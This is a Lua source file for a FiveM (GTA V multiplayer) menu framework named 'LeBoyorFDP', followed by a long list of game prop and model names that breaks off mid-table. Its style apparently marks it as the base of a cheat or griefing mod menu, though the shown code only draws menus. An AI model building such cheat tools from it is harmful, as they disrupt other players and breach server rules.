LeBoyorFDP = {}
local a = true
local b = {}
local c = {up = 172, down = 173, left = 174, right = 175, select = 215, back = 194}
local d = 0
local e = nil
local f = nil
local g = 0.11
local h = 0.03
local i = 1.0
local j = 0.038
local k = 0
local l = 0.365
local m = 0.005
local n = 0.005
function math.round(o, p)
    return tonumber(string.format("%." .. (p or 0) .. "f", o))
end
function LeBoyorFDPRGBRainbow(q)
    local r = {}
    local s = GetGameTimer() / 1000
    r.r = math.floor(math.sin(s * q + 0) * 127 + 128)
    r.g = math.floor(math.sin(s * q + 2) * 127 + 128)
    r.b = math.floor(math.sin(s * q + 4) * 127 + 128)
    return r
end
function setMenuProperty(t, u, v)
    if t and b[t] then
        b[t][u] = v
    end
end
function isMenuVisible(t)
    if t and b[t] then
        return b[t].visible
    else
        return false
    end
end
function setMenuVisible(t, w, x)
    if t and b[t] then
        setMenuProperty(t, "visible", w)
        if not x and b[t] then
            setMenuProperty(t, "currentOption", 1)
        end
        if w then
            if t ~= f and isMenuVisible(f) then
                setMenuVisible(f, false)
            end
            f = t
        end
    end
end
function drawText(y, z, A, B, C, D, E, F, G)
    SetTextColour(C.r, C.g, C.b, C.a)
    SetTextFont(B)
    SetTextScale(D, D)
    if F then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end
    if b[f] then
        if E then
            SetTextCentre(E)
        elseif G then
            SetTextWrap(b[f].x, b[f].x + b[f].width - m)
            SetTextRightJustify(true)
        end
    end
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(y)
    EndTextCommandDisplayText(z, A)
end
function drawRect(z, A, H, I, C)
    DrawRect(z, A, H, I, C.r, C.g, C.b, C.a)
end
function drawTitle()
    if b[f] then
        local z = b[f].x + b[f].width / 2
        local A = b[f].y + g / 2
        if b[f].titleBackgroundSprite then
            DrawSprite(
                b[f].titleBackgroundSprite.dict,
                b[f].titleBackgroundSprite.name,
                z,
                A,
                b[f].width,
                g,
                0.,
                255,
                255,
                255,
                255
            )
        else
            drawRect(z, A, b[f].width, g, b[f].titleBackgroundColor)
        end
        drawText(b[f].title, z, A - g / 2 + h, b[f].titleFont, b[f].titleColor, i, true)
    end
end
function drawSubTitle()
    if b[f] then
        local z = b[f].x + b[f].width / 2
        local A = b[f].y + g + j / 2
        local J = {
            r = b[f].titleBackgroundColor.r,
            g = b[f].titleBackgroundColor.g,
            b = b[f].titleBackgroundColor.b,
            a = 255
        }
        drawRect(z, A, b[f].width, j, b[f].subTitleBackgroundColor)
        drawText(b[f].subTitle, b[f].x + m, A - j / 2 + n, k, J, l, false)
        if d > b[f].maxOptionCount then
            drawText(
                tostring(b[f].currentOption) .. " / " .. tostring(d),
                b[f].x + b[f].width,
                A - j / 2 + n,
                k,
                J,
                l,
                false,
                false,
                true
            )
        end
    end
end
function drawButton(y, K)
    local z = b[f].x + b[f].width / 2
    local L = nil
    if b[f].currentOption <= b[f].maxOptionCount and d <= b[f].maxOptionCount then
        L = d
    elseif d > b[f].currentOption - b[f].maxOptionCount and d <= b[f].currentOption then
        L = d - (b[f].currentOption - b[f].maxOptionCount)
    end
    if L then
        local A = b[f].y + g + j + j * L - j / 2
        local M = nil
        local N = nil
        local O = nil
        local F = false
        if b[f].currentOption == d then
            M = b[f].menuFocusBackgroundColor
            N = b[f].menuFocusTextColor
            O = b[f].menuFocusTextColor
        else
            M = b[f].menuBackgroundColor
            N = b[f].menuTextColor
            O = b[f].menuSubTextColor
            F = true
        end
        drawRect(z, A, b[f].width, j, M)
        drawText(y, b[f].x + m, A - j / 2 + n, k, N, l, false, F)
        if K then
            drawText(K, b[f].x + m, A - j / 2 + n, k, O, l, false, F, true)
        end
    end
end
function LeBoyorFDPCreateMenu(t, P)
    b[t] = {}
    b[t].title = P
    b[t].visible = false
    b[t].previousMenu = nil
    b[t].aboutToBeClosed = false
    b[t].x = 0.02
    b[t].y = 0.04
    b[t].width = 0.27
    b[t].currentOption = 1
    b[t].maxOptionCount = 9
    b[t].titleFont = 1
    b[t].titleColor = {r = 255, g = 255, b = 255, a = 255}
    b[t].titleBackgroundColor = {r = 0, g = 0, b = 0, a = 0}
    b[t].titleBackgroundSprite = nil
    b[t].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
    b[t].menuSubTextColor = {r = 255, g = 255, b = 255, a = 255}
    b[t].menuFocusTextColor = {r = 0, g = 255, b = 255, a = 255}
    b[t].menuFocusBackgroundColor = {r = 0, g = 0, b = 0, a = 50}
    b[t].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 0}
    b[t].subTitleBackgroundColor = {r = 0, g = 0, b = 0, a = 0}
    b[t].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}
end
function LeBoyorFDPSetSpriteColor(t, Q, R, S, T)
    setMenuProperty(t, "menuTextColor", {["r"] = Q, ["g"] = R, ["b"] = S, ["a"] = T or b[t].menuBackgroundColor.a})
    setMenuProperty(t, "titleColor", {["r"] = Q, ["g"] = R, ["b"] = S, ["a"] = T or b[t].menuBackgroundColor.a})
    setMenuProperty(t, "menuSubTextColor", {["r"] = Q, ["g"] = R, ["b"] = S, ["a"] = T or b[t].menuBackgroundColor.a})
    setMenuProperty(t, "menuFocusTextColor", {["r"] = Q, ["g"] = R, ["b"] = S, ["a"] = T or b[t].menuBackgroundColor.a})
end
function LeBoyorFDPCreateSubMenu(t, U, V)
    if b[U] then
        LeBoyorFDPCreateMenu(t, b[U].title)
        if V then
            setMenuProperty(t, "subTitle", string.upper(V))
        else
            setMenuProperty(t, "subTitle", string.upper(b[U].subTitle))
        end
        setMenuProperty(t, "previousMenu", U)
        setMenuProperty(t, "x", b[U].x)
        setMenuProperty(t, "y", b[U].y)
        setMenuProperty(t, "maxOptionCount", b[U].maxOptionCount)
        setMenuProperty(t, "titleFont", b[U].titleFont)
        setMenuProperty(t, "titleColor", b[U].titleColor)
        setMenuProperty(t, "titleBackgroundColor", b[U].titleBackgroundColor)
        setMenuProperty(t, "titleBackgroundSprite", b[U].titleBackgroundSprite)
        setMenuProperty(t, "menuTextColor", b[U].menuTextColor)
        setMenuProperty(t, "menuSubTextColor", b[U].menuSubTextColor)
        setMenuProperty(t, "menuFocusTextColor", b[U].menuFocusTextColor)
        setMenuProperty(t, "menuFocusBackgroundColor", b[U].menuFocusBackgroundColor)
        setMenuProperty(t, "menuBackgroundColor", b[U].menuBackgroundColor)
        setMenuProperty(t, "subTitleBackgroundColor", b[U].subTitleBackgroundColor)
    end
end
function LeBoyorFDPCurrentMenu()
    return f
end
function LeBoyorFDPOpenMenu(t)
    if t and b[t] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        setMenuVisible(t, true)
    end
end
function LeBoyorFDPIsMenuOpened(t)
    return isMenuVisible(t)
end
function LeBoyorFDPIsAnyMenuOpened()
    for t, W in pairs(b) do
        if isMenuVisible(t) then
            return true
        end
    end
    return false
end
function LeBoyorFDPIsMenuAboutToBeClosed()
    if b[f] then
        return b[f].aboutToBeClosed
    else
        return false
    end
end
function LeBoyorFDPCloseMenu()
    if b[f] then
        if b[f].aboutToBeClosed then
            b[f].aboutToBeClosed = false
            setMenuVisible(f, false)
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            d = 0
            f = nil
            e = nil
        else
            b[f].aboutToBeClosed = true
        end
    end
end
function LeBoyorFDPButton(y, K)
    local X = y
    if K then
        X = "{ " .. tostring(X) .. ", " .. tostring(K) .. " }"
    end
    if b[f] then
        d = d + 1
        local Y = b[f].currentOption == d
        drawButton(y, K)
        if Y then
            if e == c.select then
                PlaySoundFrontend(-1, b[f].buttonPressedSound.name, b[f].buttonPressedSound.set, true)
                return true
            elseif e == c.left or e == c.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        return false
    end
end
function LeBoyorFDPMenuButton(y, t)
    if b[t] then
        if LeBoyorFDPButton(y) then
            setMenuVisible(f, false)
            setMenuVisible(t, true, true)
            return true
        end
    end
    return false
end
function LeBoyorFDPCheckBox(y, Z, _)
    if LeBoyorFDPButton(y, Z and "~w~~h~On" or "~h~~c~Off") then
        Z = not Z
        if _ then
            _(Z)
        end
        return true
    end
    return false
end
function LeBoyorFDPComboBox(y, a0, a1, a2, _)
    local a3 = #a0
    local a4 = a0[a1]
    local Y = b[f].currentOption == d + 1
    if a3 > 1 and Y then
        a4 = "← " .. tostring(a4) .. " →"
    end
    if LeBoyorFDPButton(y, a4) then
        a2 = a1
        _(a1, a2)
        return true
    elseif Y then
        if e == c.left then
            if a1 > 1 then
                a1 = a1 - 1
            else
                a1 = a3
            end
        elseif e == c.right then
            if a1 < a3 then
                a1 = a1 + 1
            else
                a1 = 1
            end
        end
    else
        a1 = a2
    end
    _(a1, a2)
    return false
end
function LeBoyorFDPDisplay()
    if isMenuVisible(f) then
        if b[f].aboutToBeClosed then
            LeBoyorFDPCloseMenu()
        else
            ClearAllHelpMessages()
            drawTitle()
            drawSubTitle()
            e = nil
            if IsDisabledControlJustReleased(1, c.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if b[f].currentOption < d then
                    b[f].currentOption = b[f].currentOption + 1
                else
                    b[f].currentOption = 1
                end
            elseif IsDisabledControlJustReleased(1, c.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if b[f].currentOption > 1 then
                    b[f].currentOption = b[f].currentOption - 1
                else
                    b[f].currentOption = d
                end
            elseif IsDisabledControlJustReleased(1, c.left) then
                e = c.left
            elseif IsDisabledControlJustReleased(1, c.right) then
                e = c.right
            elseif IsDisabledControlJustReleased(1, c.select) then
                e = c.select
            elseif IsDisabledControlJustPressed(1, c.back) then
                if b[b[f].previousMenu] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    setMenuVisible(b[f].previousMenu, true)
                else
                    LeBoyorFDPCloseMenu()
                end
            end
            d = 0
        end
    end
end
function LeBoyorFDPSetMenuWidth(t, H)
    setMenuProperty(t, "width", H)
end
function LeBoyorFDPSetMenuX(t, z)
    setMenuProperty(t, "x", z)
end
function LeBoyorFDPSetMenuY(t, A)
    setMenuProperty(t, "y", A)
end
function LeBoyorFDPSetMenuMaxOptionCountOnScreen(t, a5)
    setMenuProperty(t, "maxOptionCount", a5)
end
function LeBoyorFDPSetTitle(t, P)
    setMenuProperty(t, "title", P)
end
function LeBoyorFDPSetTitleColor(t, Q, R, S, T)
    setMenuProperty(t, "titleColor", {["r"] = Q, ["g"] = R, ["b"] = S, ["a"] = T or b[t].titleColor.a})
end
function LeBoyorFDPSetTitleBackgroundColor(t, Q, R, S, T)
    setMenuProperty(
        t,
        "titleBackgroundColor",
        {["r"] = Q, ["g"] = R, ["b"] = S, ["a"] = T or b[t].titleBackgroundColor.a}
    )
end
function LeBoyorFDPSetTitleBackgroundSprite(t, a6, a7)
    RequestStreamedTextureDict(a6)
    setMenuProperty(t, "titleBackgroundSprite", {dict = a6, name = a7})
end
function LeBoyorFDPSetSubTitle(t, y)
    setMenuProperty(t, "subTitle", string.upper(y))
end
function LeBoyorFDPSetMenuBackgroundColor(t, Q, R, S, T)
    setMenuProperty(
        t,
        "menuBackgroundColor",
        {["r"] = Q, ["g"] = R, ["b"] = S, ["a"] = T or b[t].menuBackgroundColor.a}
    )
end
function LeBoyorFDPSetMenuTextColor(t, Q, R, S, T)
    setMenuProperty(t, "menuTextColor", {["r"] = Q, ["g"] = R, ["b"] = S, ["a"] = T or b[t].menuTextColor.a})
end
function LeBoyorFDPSetMenuSubTextColor(t, Q, R, S, T)
    setMenuProperty(t, "menuSubTextColor", {["r"] = Q, ["g"] = R, ["b"] = S, ["a"] = T or b[t].menuSubTextColor.a})
end
function LeBoyorFDPSetMenuFocusColor(t, Q, R, S, T)
    setMenuProperty(t, "menuFocusColor", {["r"] = Q, ["g"] = R, ["b"] = S, ["a"] = T or b[t].menuFocusColor.a})
end
function LeBoyorFDPSetMenuButtonPressedSound(t, a8, a9)
    setMenuProperty(t, "buttonPressedSound", {["name"] = a8, ["set"] = a9})
end
function LeBoyorFDPDisplayBox(aa, ab, ac)
    AddTextEntry("FMMC_KEY_TIP9N", aa .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP9N", "", ab, "", "", "", ac)
    a78d8d85dssss = true
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        local ad = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        a78d8d85dssss = false
        return ad
    else
        Citizen.Wait(500)
        a78d8d85dssss = false
        return nil
    end
end
local ae = {
    "prop_gold_cont_01",
    "p_crahsed_heli_s",
    "prop_rock_4_big2",
    "prop_beachflag_le",
    "prop_fnclink_05crnr1",
    "xs_prop_hamburgher_wl",
    "sr_prop_spec_tube_xxs_01a",
    "cargoplane",
    "prop_beach_fire",
    -145066854,
    "apa_mp_apa_yacht",
    "p_spinning_anus_s",
    "p_med_jet_01_s",
    "stt_prop_stunt_jump30",
    "stt_prop_stunt_jump15",
    "stt_prop_stunt_jump45",
    "stt_prop_stunt_track_dwslope15",
    "stt_prop_stunt_track_dwslope30",
    "prop_container_01a",
    "p_crahsed_heli_s",
    "prop_rock_4_big2",
    "prop_beachflag_le",
    "prop_gascage01",
    "prop_ld_ferris_wheel",
    "apa_mp_apa_crashed_usaf_01a",
    "apa_mp_apa_yacht",
    "apa_mp_apa_yacht_jacuzzi_ripple1",
    "apa_mp_apa_yacht_o3_rail_a",
    "apa_mp_apa_yacht_option1",
    "apa_mp_apa_yacht_option2",
    "apa_prop_ss1_mpint_garage2",
    "bkr_prop_biker_bblock_lrg2",
    "bkr_prop_biker_garage_locker_01",
    "bkr_prop_biker_landing_zone_01",
    "bkr_prop_biker_target",
    "bkr_prop_biker_target_small",
    "bkr_prop_bkr_cashpile_01",
    "bkr_prop_weed_med_01b",
    "ce_xr_ctr2",
    "gr_prop_gr_doorpart_f",
    "gr_prop_gr_crates_weapon_mix_01b",
    "gr_prop_gr_fnclink_03g",
    "gr_prop_gr_fnclink_03f",
    "gr_prop_gr_para_s_01",
    "prop_dt1_20_mp_gar",
    "prop_dummy_01",
    "prop_dumpster_4b",
    "prop_dumpster_4a",
    "prop_elecbox_01a",
    "prop_elecbox_16",
    "prop_phonebox_04",
    "prop_pier_kiosk_03",
    "prop_pile_dirt_02",
    "prop_pile_dirt_07_cr",
    "prop_rub_wreckage_9",
    "prop_telegraph_01b",
    "sr_prop_spec_tube_crn_01a",
    "prop_ind_barge_01_cr",
    "prop_ind_deiseltank",
    "prop_ind_oldcrane",
    "prop_inflatearch_01",
    "w_ar_musket",
    "xm_prop_tunnel_fan_01",
    "xm_prop_x17_l_glass_01",
    "xm_prop_x17_mine_01a",
    "xm_prop_x17_mine_03a",
    "xm_prop_x17_osphatch_27m",
    "xm_prop_x17_pillar",
    "xm_prop_x17_osphatch_op_27m",
    "xm_prop_x17_shamal_crash",
    "xm_prop_x17_silo_01a",
    "xm_prop_x17_sub",
    "xm_prop_x17_sub_damage",
    "xm_prop_x17_trail_01a",
    "xm_prop_x17_xmas_tree_int",
    "dt1_05_build1_damage",
    "dt1_05_build1_damage_lod",
    "xs_combined2_dyst_07_build_a",
    "xs_combined2_dyst_07_build_b",
    "xs_combined2_dyst_07_build_c",
    "xs_combined2_dyst_07_build_e",
    "xs_combined2_dyst_build_01a_09",
    "xs_combined2_dyst_build_01b_09",
    "xs_combined2_dyst_build_02a_09",
    "xs_combined2_dyst_longbuild_b_09",
    "xs_combined2_dyst_longbuild_c_09",
    "dt1_05_build1_h",
    "prop_rock_1_h",
    "prop_test_boulder_01",
    "prop_test_boulder_02",
    "prop_test_boulder_03",
    "prop_test_boulder_04",
    "apa_mp_apa_crashed_usaf_01a",
    "ex_prop_exec_crashdp",
    "apa_mp_apa_yacht_o1_rail_a",
    "apa_mp_apa_yacht_o1_rail_b",
    "apa_mp_h_yacht_armchair_01",
    "apa_mp_h_yacht_armchair_03",
    "apa_mp_h_yacht_armchair_04",
    "apa_mp_h_yacht_barstool_01",
    "apa_mp_h_yacht_bed_01",
    "apa_mp_h_yacht_bed_02",
    "apa_mp_h_yacht_coffee_table_01",
    "apa_mp_h_yacht_coffee_table_02",
    "apa_mp_h_yacht_floor_lamp_01",
    "apa_mp_h_yacht_side_table_01",
    "apa_mp_h_yacht_side_table_02",
    "apa_mp_h_yacht_sofa_01",
    "apa_mp_h_yacht_sofa_02",
    "apa_mp_h_yacht_stool_01",
    "apa_mp_h_yacht_strip_chair_01",
    "apa_mp_h_yacht_table_lamp_01",
    "apa_mp_h_yacht_table_lamp_02",
    "apa_mp_h_yacht_table_lamp_03",
    "prop_flag_columbia",
    "apa_mp_apa_yacht_o2_rail_a",
    "apa_mp_apa_yacht_o2_rail_b",
    "apa_mp_apa_yacht_o3_rail_a",
    "apa_mp_apa_yacht_o3_rail_b",
    "apa_mp_apa_yacht_option1",
    "proc_searock_01",
    "apa_mp_h_yacht_",
    "apa_mp_apa_yacht_option1_cola",
    "apa_mp_apa_yacht_option2",
    "apa_mp_apa_yacht_option2_cola",
    "apa_mp_apa_yacht_option2_colb",
    "apa_mp_apa_yacht_option3",
    "apa_mp_apa_yacht_option3_cola",
    "apa_mp_apa_yacht_option3_colb",
    "apa_mp_apa_yacht_option3_colc",
    "apa_mp_apa_yacht_option3_cold",
    "apa_mp_apa_yacht_option3_cole",
    "apa_mp_apa_yacht_jacuzzi_cam",
    "apa_mp_apa_yacht_jacuzzi_ripple003",
    "apa_mp_apa_yacht_jacuzzi_ripple1",
    "apa_mp_apa_yacht_jacuzzi_ripple2",
    "apa_mp_apa_yacht_radar_01a",
    "apa_mp_apa_yacht_win",
    "prop_crashed_heli",
    "apa_mp_apa_yacht_door",
    "prop_shamal_crash",
    "xm_prop_x17_shamal_crash",
    "apa_mp_apa_yacht_door2",
    "apa_mp_apa_yacht",
    "prop_flagpole_2b",
    "prop_flagpole_2c",
    "prop_flag_canada",
    "apa_prop_yacht_float_1a",
    "apa_prop_yacht_float_1b",
    "apa_prop_yacht_glass_01",
    "apa_prop_yacht_glass_02",
    "apa_prop_yacht_glass_03",
    "apa_prop_yacht_glass_04",
    "apa_prop_yacht_glass_05",
    "apa_prop_yacht_glass_06",
    "apa_prop_yacht_glass_07",
    "apa_prop_yacht_glass_08",
    "apa_prop_yacht_glass_09",
    "apa_prop_yacht_glass_10",
    "prop_flag_canada_s",
    "prop_flag_eu",
    "prop_flag_eu_s",
    "prop_target_blue_arrow",
    "prop_target_orange_arrow",
    "prop_target_purp_arrow",
    "prop_target_red_arrow",
    "apa_prop_flag_argentina",
    "apa_prop_flag_australia",
    "apa_prop_flag_austria",
    "apa_prop_flag_belgium",
    "apa_prop_flag_brazil",
    "apa_prop_flag_canadat_yt",
    "apa_prop_flag_china",
    "apa_prop_flag_columbia",
    "apa_prop_flag_croatia",
    "apa_prop_flag_czechrep",
    "apa_prop_flag_denmark",
    "apa_prop_flag_england",
    "apa_prop_flag_eu_yt",
    "apa_prop_flag_finland",
    "apa_prop_flag_france",
    "apa_prop_flag_german_yt",
    "apa_prop_flag_hungary",
    "apa_prop_flag_ireland",
    "apa_prop_flag_israel",
    "apa_prop_flag_italy",
    "apa_prop_flag_jamaica",
    "apa_prop_flag_japan_yt",
    "apa_prop_flag_canada_yt",
    "apa_prop_flag_lstein",
    "apa_prop_flag_malta",
    "apa_prop_flag_mexico_yt",
    "apa_prop_flag_netherlands",
    "apa_prop_flag_newzealand",
    "apa_prop_flag_nigeria",
    "apa_prop_flag_norway",
    "apa_prop_flag_palestine",
    "apa_prop_flag_poland",
    "apa_prop_flag_portugal",
    "apa_prop_flag_puertorico",
    "apa_prop_flag_russia_yt",
    "apa_prop_flag_scotland_yt",
    "apa_prop_flag_script",
    "apa_prop_flag_slovakia",
    "apa_prop_flag_slovenia",
    "apa_prop_flag_southafrica",
    "apa_prop_flag_southkorea",
    "apa_prop_flag_spain",
    "apa_prop_flag_sweden",
    "apa_prop_flag_switzerland",
    "apa_prop_flag_turkey",
    "apa_prop_flag_uk_yt",
    "apa_prop_flag_us_yt",
    "apa_prop_flag_wales",
    "prop_flag_uk",
    "prop_flag_uk_s",
    "prop_flag_us",
    "prop_flag_usboat",
    "prop_flag_us_r",
    "prop_flag_us_s",
    "prop_flag_france",
    "prop_flag_france_s",
    "prop_flag_german",
    "prop_flag_german_s",
    "prop_flag_ireland",
    "prop_flag_ireland_s",
    "prop_flag_japan",
    "prop_flag_japan_s",
    "prop_flag_ls",
    "prop_flag_lsfd",
    "prop_flag_lsfd_s",
    "prop_flag_lsservices",
    "prop_flag_lsservices_s",
    "prop_flag_ls_s",
    "prop_flag_mexico",
    "prop_flag_mexico_s",
    "prop_flag_russia",
    "prop_flag_russia_s",
    "prop_flag_s",
    "prop_flag_sa",
    "prop_flag_sapd",
    "prop_flag_sapd_s",
    "prop_flag_sa_s",
    "prop_flag_scotland",
    "prop_flag_scotland_s",
    "prop_flag_sheriff",
    "prop_flag_sheriff_s",
    "prop_flag_uk",
    "prop_flag_uk_s",
    "prop_flag_us",
    "prop_flag_usboat",
    "prop_flag_us_r",
    "prop_flag_us_s",
    "prop_flamingo",
    "prop_swiss_ball_01",
    "prop_air_bigradar_l1",
    "prop_air_bigradar_l2",
    "prop_air_bigradar_slod",
    "p_fib_rubble_s",
    "prop_money_bag_01",
    "p_cs_mp_jet_01_s",
    "prop_poly_bag_money",
    "prop_air_radar_01",
    "hei_prop_carrier_radar_1",
    "prop_air_bigradar",
    "prop_carrier_radar_1_l1",
    "prop_asteroid_01",
    "prop_xmas_ext",
    "p_oil_pjack_01_amo",
    "p_oil_pjack_01_s",
    "p_oil_pjack_02_amo",
    "p_oil_pjack_03_amo",
    "p_oil_pjack_02_s",
    "p_oil_pjack_03_s",
    "prop_aircon_l_03",
    "prop_med_jet_01",
    "p_med_jet_01_s",
    "hei_prop_carrier_jet",
    "bkr_prop_biker_bblock_huge_01",
    "bkr_prop_biker_bblock_huge_02",
    "bkr_prop_biker_bblock_huge_04",
    "bkr_prop_biker_bblock_huge_05",
    "hei_prop_heist_emp",
    "prop_weed_01",
    "prop_air_bigradar",
    "prop_juicestand",
    "prop_lev_des_barge_02",
    "hei_prop_carrier_defense_01",
    "prop_aircon_m_04",
    "prop_mp_ramp_03",
    "stt_prop_stunt_track_dwuturn",
    "ch3_12_animplane1_lod",
    "ch3_12_animplane2_lod",
    "hei_prop_hei_pic_pb_plane",
    "light_plane_rig",
    "prop_cs_plane_int_01",
    "prop_dummy_plane",
    "prop_mk_plane",
    "v_44_planeticket",
    "prop_planer_01",
    "ch3_03_cliffrocks03b_lod",
    "cargoplane",
    "jet",
    "csx_coastsmalrock_02_",
    "csx_coastsmalrock_03_",
    "csx_coastsmalrock_04_",
    "mp_player_introck",
    "Heist_Yacht",
    "csx_coastsmalrock_05_",
    "mp_player_int_rock",
    "mp_player_introck",
    "prop_flagpole_1a",
    "prop_flagpole_2a",
    "prop_flagpole_3a",
    "prop_a4_pile_01",
    "cs2_10_sea_rocks_lod",
    "cs2_11_sea_marina_xr_rocks_03_lod",
    "prop_gold_cont_01",
    "prop_hydro_platform",
    "ch3_04_viewplatform_slod",
    "ch2_03c_rnchstones_lod",
    "proc_mntn_stone01",
    "prop_beachflag_le",
    "proc_mntn_stone02",
    "cs2_10_sea_shipwreck_lod",
    "des_shipsink_02",
    "prop_dock_shippad",
    "des_shipsink_03",
    "des_shipsink_04",
    "prop_mk_flag",
    "prop_mk_flag_2",
    "proc_mntn_stone03",
    "FreeModeMale01",
    "rsn_os_specialfloatymetal_n",
    "rsn_os_specialfloatymetal",
    "cs1_09_sea_ufo",
    "rsn_os_specialfloaty2_light2",
    "rsn_os_specialfloaty2_light",
    "rsn_os_specialfloaty2",
    "rsn_os_specialfloatymetal_n",
    "rsn_os_specialfloatymetal",
    "P_Spinning_Anus_S_Main",
    "P_Spinning_Anus_S_Root",
    "cs3_08b_rsn_db_aliencover_0001cs3_08b_rsn_db_aliencover_0001_a",
    "sc1_04_rnmo_paintoverlaysc1_04_rnmo_paintoverlay_a",
    "rnbj_wallsigns_0001",
    "proc_sml_stones01",
    "proc_sml_stones02",
    "maverick",
    "Miljet",
    "proc_sml_stones03",
    "proc_stones_01",
    "proc_stones_02",
    "proc_stones_03",
    "proc_stones_04",
    "proc_stones_05",
    "proc_stones_06",
    "prop_coral_stone_03",
    "prop_coral_stone_04",
    "prop_gravestones_01a",
    "prop_gravestones_02a",
    "prop_gravestones_03a",
    "prop_gravestones_04a",
    "prop_gravestones_05a",
    "prop_gravestones_06a",
    "prop_gravestones_07a",
    "prop_gravestones_08a",
    "prop_gravestones_09a",
    "prop_gravestones_10a",
    "prop_prlg_gravestone_05a_l1",
    "prop_prlg_gravestone_06a",
    "test_prop_gravestones_04a",
    "test_prop_gravestones_05a",
    "test_prop_gravestones_07a",
    "test_prop_gravestones_08a",
    "test_prop_gravestones_09a",
    "prop_prlg_gravestone_01a",
    "prop_prlg_gravestone_02a",
    "prop_prlg_gravestone_03a",
    "prop_prlg_gravestone_04a",
    "prop_stoneshroom1",
    "prop_stoneshroom2",
    "v_res_fa_stones01",
    "test_prop_gravestones_01a",
    "test_prop_gravestones_02a",
    "prop_prlg_gravestone_05a",
    "FreemodeFemale01",
    "p_cablecar_s",
    "stt_prop_stunt_tube_l",
    "stt_prop_stunt_track_dwuturn",
    "p_spinning_anus_s",
    "prop_windmill_01",
    "hei_prop_heist_tug",
    "prop_air_bigradar",
    "p_oil_slick_01",
    "prop_dummy_01",
    "hei_prop_heist_emp",
    "p_tram_cash_s",
    "hw1_blimp_ce2",
    "prop_fire_exting_1a",
    "prop_fire_exting_1b",
    "prop_fire_exting_2a",
    "prop_fire_exting_3a",
    "hw1_blimp_ce2_lod",
    "hw1_blimp_ce_lod",
    "hw1_blimp_cpr003",
    "hw1_blimp_cpr_null",
    "hw1_blimp_cpr_null2",
    "prop_lev_des_barage_02",
    "hei_prop_carrier_defense_01",
    "prop_juicestand",
    "S_M_M_MovAlien_01",
    "s_m_m_movalien_01",
    "s_m_m_movallien_01",
    "u_m_y_babyd",
    "CS_Orleans",
    "A_M_Y_ACult_01",
    "S_M_M_MovSpace_01",
    "U_M_Y_Zombie_01",
    "s_m_y_blackops_01",
    "a_f_y_topless_01",
    "a_c_boar",
    "a_c_cat_01",
    "a_c_chickenhawk",
    "a_c_chimp",
    "s_f_y_hooker_03",
    "a_c_chop",
    "a_c_cormorant",
    "a_c_cow",
    "a_c_coyote",
    "v_ilev_found_cranebucket",
    "p_cs_sub_hook_01_s",
    "a_c_crow",
    "a_c_dolphin",
    "a_c_fish",
    "hei_prop_heist_hook_01",
    "prop_rope_hook_01",
    "prop_sub_crane_hook",
    "s_f_y_hooker_01",
    "prop_vehicle_hook",
    "prop_v_hook_s",
    "prop_dock_crane_02_hook",
    "prop_winch_hook_long",
    "a_c_hen",
    "a_c_humpback",
    "a_c_husky",
    "a_c_killerwhale",
    "a_c_mtlion",
    "a_c_pigeon",
    "a_c_poodle",
    "prop_coathook_01",
    "prop_cs_sub_hook_01",
    "a_c_pug",
    "a_c_rabbit_01",
    "a_c_rat",
    "a_c_retriever",
    "a_c_rhesus",
    "a_c_rottweiler",
    "a_c_sharkhammer",
    "a_c_sharktiger",
    "a_c_shepherd",
    "a_c_stingray",
    "a_c_westy",
    "CS_Orleans",
    "prop_windmill_01",
    "prop_Ld_ferris_wheel",
    "p_tram_crash_s",
    "p_oil_slick_01",
    "p_ld_stinger_s",
    "p_ld_soc_ball_01",
    "p_parachute1_s",
    "p_cablecar_s",
    "prop_beach_fire",
    "prop_lev_des_barge_02",
    "prop_lev_des_barge_01",
    "prop_sculpt_fix",
    "prop_flagpole_2b",
    "prop_flagpole_2c",
    "prop_winch_hook_short",
    "prop_flag_canada",
    "prop_flag_canada_s",
    "prop_flag_eu",
    "prop_flag_eu_s",
    "prop_flag_france",
    "prop_flag_france_s",
    "prop_flag_german",
    "prop_ld_hook",
    "prop_flag_german_s",
    "prop_flag_ireland",
    "prop_flag_ireland_s",
    "prop_flag_japan",
    "prop_flag_japan_s",
    "prop_flag_ls",
    "prop_flag_lsfd",
    "prop_flag_lsfd_s",
    "prop_cable_hook_01",
    "prop_flag_lsservices",
    "prop_flag_lsservices_s",
    "prop_flag_ls_s",
    "prop_flag_mexico",
    "prop_flag_mexico_s",
    "csx_coastboulder_00",
    "des_tankercrash_01",
    "des_tankerexplosion_01",
    "des_tankerexplosion_02",
    "des_trailerparka_02",
    "des_trailerparkb_02",
    "des_trailerparkc_02",
    "des_trailerparkd_02",
    "des_traincrash_root2",
    "des_traincrash_root3",
    "des_traincrash_root4",
    "des_traincrash_root5",
    "des_finale_vault_end",
    "des_finale_vault_root001",
    "des_finale_vault_root002",
    "des_finale_vault_root003",
    "des_finale_vault_root004",
    "des_finale_vault_start",
    "des_vaultdoor001_root001",
    "des_vaultdoor001_root002",
    "des_vaultdoor001_root003",
    "des_vaultdoor001_root004",
    "des_vaultdoor001_root005",
    "des_vaultdoor001_root006",
    "des_vaultdoor001_skin001",
    "des_vaultdoor001_start",
    "des_traincrash_root6",
    "prop_ld_vault_door",
    "prop_vault_door_scene",
    "prop_vault_door_scene",
    "prop_vault_shutter",
    "p_fin_vaultdoor_s",
    "v_ilev_bk_vaultdoor",
    "prop_gold_vault_fence_l",
    "prop_gold_vault_fence_r",
